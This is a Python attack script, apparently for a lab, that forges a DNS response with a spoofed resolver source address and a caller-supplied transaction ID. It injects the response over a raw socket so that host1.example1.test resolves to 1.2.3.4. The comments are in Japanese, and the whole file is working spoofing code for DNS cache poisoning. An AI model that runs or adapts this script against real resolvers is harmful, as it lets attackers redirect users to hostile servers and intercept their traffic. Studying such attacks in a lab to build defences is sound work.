import sys
import socket
import struct

if len(sys.argv) < 2:
    print("Usage: python3 send-spoof.py <TXID_HEX>")
    sys.exit(1)

txid_hex = sys.argv[1].replace("0x", "").zfill(4)
txid_bytes = bytes.fromhex(txid_hex)

SRC_IP = "192.168.1.12"
DST_IP = "192.168.1.11"
SRC_PORT = 53
DST_PORT = 53000

RESOLVE_NAME = "05686f737431086578616d706c6531047465737400" # host1.example1.test
TARGET_ID = "01020304" # 1.2.3.4

# 1. DNSペイロードの動的組み立て
dns_header = txid_bytes + bytes.fromhex("81800001000100000001") # 追加レコード数=1
dns_questions = bytes.fromhex(f"{RESOLVE_NAME}00010001")
dns_answers = bytes.fromhex(f"{RESOLVE_NAME}000100010000003c0004{TARGET_ID}")
edns0_opt = bytes.fromhex("00002904d000008000000c000a00089a2fec379584ae13")

# DNS全体のペイロード
dns_payload = dns_header + dns_questions + dns_answers + edns0_opt

# 2. 長さの自動計算 (固定値ではなく動的に取得)
udp_length = 8 + len(dns_payload)
ip_tot_len = 20 + udp_length

# 3. UDPヘッダーの組み立て
udp_header = struct.pack("!HHHH", SRC_PORT, DST_PORT, udp_length, 0x0000)

# 4. IPヘッダーの組み立て
ip_ver_ihl = 0x45
ip_tos = 0x00
ip_id = 54321
ip_frag_off = 0x0000
ip_ttl = 64
ip_proto = socket.IPPROTO_UDP
ip_check = 0x0000 # 0にしておくとLinuxカーネルが送信時に正しいチェックサムを上書き計算します

src_ip_bytes = socket.inet_aton(SRC_IP)
dst_ip_bytes = socket.inet_aton(DST_IP)

ip_header = struct.pack(
    "!BBHHHBBH4s4s",
    ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
    ip_ttl, ip_proto, ip_check, src_ip_bytes, dst_ip_bytes
)

# 5. パケット全体の結合
full_packet = ip_header + udp_header + dns_payload

# 6. RAWソケットでの送信
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(full_packet, (DST_IP, DST_PORT))
    print(f"--- 整合性修正版パケットを射出しました ---")
    print(f"IP総長: {ip_tot_len} バイト / UDP長: {udp_length} バイト")
    print(f"送信ルート: {SRC_IP}:{SRC_PORT} -> {DST_IP}:{DST_PORT}")
except PermissionError:
    print("エラー: root権限（NET_ADMIN）が必要です。")
except Exception as e:
    print(f"エラー: {e}")
